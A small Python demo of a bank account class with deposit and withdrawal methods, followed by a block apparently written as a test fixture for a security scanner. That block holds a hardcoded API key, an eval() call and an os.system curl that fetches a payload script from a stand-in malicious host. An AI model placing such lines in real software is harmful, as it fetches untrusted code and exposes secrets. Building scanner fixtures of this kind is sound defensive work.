# Simple Fintech Transaction Processor (for demo only!)
class Account:
    def __init__(self, name, balance=0):
        self.name = name
        self.balance = balance

    def deposit(self, amount):
        if amount > 0:
            self.balance += amount
            print(f"{self.name} deposited ${amount}. New balance: ${self.balance}")

    def withdraw(self, amount):
        if 0 < amount <= self.balance:
            self.balance -= amount
            print(f"{self.name} withdrew ${amount}. New balance: ${self.balance}")
        else:
            print(f"{self.name} cannot withdraw ${amount}. Insufficient funds.")

if __name__ == "__main__":
    alice = Account("Alice", 1000)
    bob = Account("Bob", 500)
    alice.deposit(200)
    alice.withdraw(150)
    bob.withdraw(700)

# 🛑 Simulated poisoned logic for forensic scan

import os

def insecure():
    api_key = "sk_test_1234567890abcdef"  # Hardcoded secret
    eval("print('Executing insecure eval()')")  # Dangerous function
    os.system("curl http://malicious.example.com/payload.sh")  # Suspicious network call
s